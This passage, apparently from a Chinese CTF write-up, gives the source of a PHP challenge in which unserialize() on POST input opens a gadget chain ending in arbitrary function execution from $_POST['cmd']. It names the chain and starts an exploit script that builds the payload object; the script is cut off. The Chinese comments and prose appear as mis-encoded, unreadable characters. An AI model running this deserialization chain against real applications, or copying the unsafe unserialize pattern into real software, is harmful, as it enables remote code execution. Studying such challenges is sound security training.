</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ApplicationContext</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$contextName</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">contextName</span> <span class="o">=</span> <span class="s1">&#39;ApplicationContext&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__destruct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">contextName</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">contextName</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ContentProcessor</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$processedContent</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$callbackFunction</span><span class="p">;</span>   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">processedContent</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FunctionInvoker</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">){</span><span class="c1">//å°è¯•è®¿é—®ä¸€ä¸ªä¸å¯è®¿é—®çš„å±æ€§æ—¶ï¼Œ__get() æ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚åˆšå¥½æ­¤ç±»æœ‰ä¸ªç§æœ‰å±æ€§private $processedContent; 
</span></span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">property_exists</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="nv">$key</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">is_object</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$key</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">is_string</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">callbackFunction</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$key</span><span class="o">-&gt;</span><span class="p">{</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">callbackFunction</span><span class="p">}(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FileManager</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$targetFile</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$responseData</span> <span class="o">=</span> <span class="s1">&#39;default_response&#39;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$targetFile</span> <span class="o">=</span> <span class="k">null</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">targetFile</span> <span class="o">=</span> <span class="nv">$targetFile</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">filterPath</span><span class="p">(){</span> 
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\/|php:|data|zip|\.\.\//i&#39;</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">targetFile</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;æ–‡ä»¶è·¯å¾„ä¸ç¬¦åˆè§„èŒƒ&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">performWriteOperation</span><span class="p">(</span><span class="nv">$var</span><span class="p">){</span> 
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="nv">$targetObject</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">targetFile</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">        <span class="nv">$value</span> <span class="o">=</span> <span class="nv">$targetObject</span><span class="o">-&gt;</span><span class="nv">$var</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">getFileHash</span><span class="p">(){</span> 
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">filterPath</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">is_string</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">targetFile</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">targetFile</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$md5_hash</span> <span class="o">=</span> <span class="nx">md5_file</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">targetFile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;æ–‡ä»¶MD5å“ˆå¸Œ: &#34;</span> <span class="o">.</span> <span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$md5_hash</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">die</span><span class="p">(</span><span class="s2">&#34;æ–‡ä»¶æœªæ‰¾åˆ°&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">is_object</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">targetFile</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">                <span class="nv">$md5_hash</span> <span class="o">=</span> <span class="nx">md5_file</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">targetFile</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;æ–‡ä»¶MD5å“ˆå¸Œ (å°è¯•): &#34;</span> <span class="o">.</span> <span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$md5_hash</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">TypeError</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;æ— æ³•è®¡ç®—MD5å“ˆå¸Œï¼Œå› ä¸ºæ–‡ä»¶å‚æ•°æ— æ•ˆ: &#34;</span> <span class="o">.</span> <span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;æ–‡ä»¶æœªæ‰¾åˆ°&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;method&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">method_exists</span><span class="p">(</span><span class="nv">$this</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;method&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$method</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;method&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$var</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;var&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;var&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="nv">$method</span><span class="p">(</span><span class="nv">$var</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">responseData</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FunctionInvoker</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$functionName</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$functionArguments</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$arg</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">function_exists</span><span class="p">(</span><span class="nv">$name</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$name</span><span class="p">(</span><span class="nv">$arg</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> 
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$action</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;home&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$output</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="nv">$upload_dir</span> <span class="o">=</span> <span class="s2">&#34;upload/&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$upload_dir</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$upload_dir</span><span class="p">,</span> <span class="mo">0777</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">===</span> <span class="s1">&#39;upload_file&#39;</span><span class="p">)</span> <span class="p">{</span> 
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;error&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="nx">UPLOAD_ERR_OK</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$allowed_extensions</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;txt&#39;</span><span class="p">,</span> <span class="s1">&#39;png&#39;</span><span class="p">,</span> <span class="s1">&#39;gif&#39;</span><span class="p">,</span> <span class="s1">&#39;jpg&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$file_info</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$file_extension</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$file_info</span><span class="p">[</span><span class="s1">&#39;extension&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$file_info</span><span class="p">[</span><span class="s1">&#39;extension&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$file_extension</span><span class="p">,</span> <span class="nv">$allowed_extensions</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$output</span> <span class="o">=</span> <span class="s2">&#34;&lt;p class=&#39;text-red-600&#39;&gt;ä¸å…è®¸çš„æ–‡ä»¶ç±»å‹ã€‚åªå…è®¸ txt, png, gif, jpgã€‚&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">                <span class="nv">$unique_filename</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">time</span><span class="p">()</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">])</span> <span class="o">.</span> <span class="s1">&#39;.&#39;</span> <span class="o">.</span> <span class="nv">$file_extension</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$upload_path</span> <span class="o">=</span> <span class="nv">$upload_dir</span> <span class="o">.</span> <span class="nv">$unique_filename</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span> <span class="nv">$upload_path</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$output</span> <span class="o">=</span> <span class="s2">&#34;&lt;p class=&#39;text-green-600&#39;&gt;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$output</span> <span class="o">.=</span> <span class="s2">&#34;&lt;p class=&#39;text-gray-700&#39;&gt;æ–‡ä»¶è·¯å¾„ï¼š&lt;code class=&#39;bg-gray-200 p-1 rounded&#39;&gt;&#34;</span> <span class="o">.</span> <span class="nx">htmlspecialchars</span><span class="p">(</span><span class="nv">$upload_path</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;&lt;/code&gt;&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$output</span> <span class="o">=</span> <span class="s2">&#34;&lt;p class=&#39;text-red-600&#39;&gt;ä¸Šä¼ å¤±è´¥ï¼&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$output</span> <span class="o">=</span> <span class="s2">&#34;&lt;p class=&#39;text-red-600&#39;&gt;è¯·é€‰æ‹©ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ã€‚&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">//æ£€éªŒmd5
</span></span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$action</span> <span class="o">===</span> <span class="s1">&#39;home&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit_md5&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$filename_param</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file_to_check&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;file_to_check&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$filename_param</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_object</span> <span class="o">=</span> <span class="o">@</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$filename_param</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$file_object</span> <span class="o">===</span> <span class="k">false</span> <span class="o">||</span> <span class="o">!</span><span class="p">(</span><span class="nv">$file_object</span> <span class="nx">instanceof</span> <span class="nx">FileManager</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$file_object</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FileManager</span><span class="p">(</span><span class="nv">$filename_param</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$output</span> <span class="o">=</span> <span class="nv">$file_object</span><span class="o">-&gt;</span><span class="na">getFileHash</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$output</span> <span class="o">=</span> <span class="s2">&#34;&lt;p class=&#39;text-gray-600&#39;&gt;è¯·è¾“å…¥æ–‡ä»¶è·¯å¾„è¿›è¡ŒMD5æ ¡éªŒã€‚&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>é“¾å­å¾ˆç®€å•<strong>ApplicationContext-&gt;FileManager-&gt;ContentProcessor-&gt;FunctionInvoker</strong>ï¼Œ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ApplicationContext</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$contextName</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">ContentProcessor</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">private</span> <span class="nv">$processedContent</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$callbackFunction</span><span class="p">;</span>   
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">processedContent</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">FunctionInvoker</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FileManager</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$targetFile</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$responseData</span> <span class="o">=</span> <span class="s1">&#39;default_response&#39;</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">FunctionInvoker</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$functionName</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$functionArguments</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">ApplicationContext</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">contextName</span><span class="o">=</span><span class="k">new</span> <span class="nx">FileManager</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">contextName</span><span class="o">-&gt;</span><span class="na">targetFile</span><span class="o">=</span><span class="k">new</span> <span class="nx">ContentProcessor</span><span class="p">(</span><span class="k">new</span> <span class="nx">FunctionInvoker</span><span class="p">());</span>
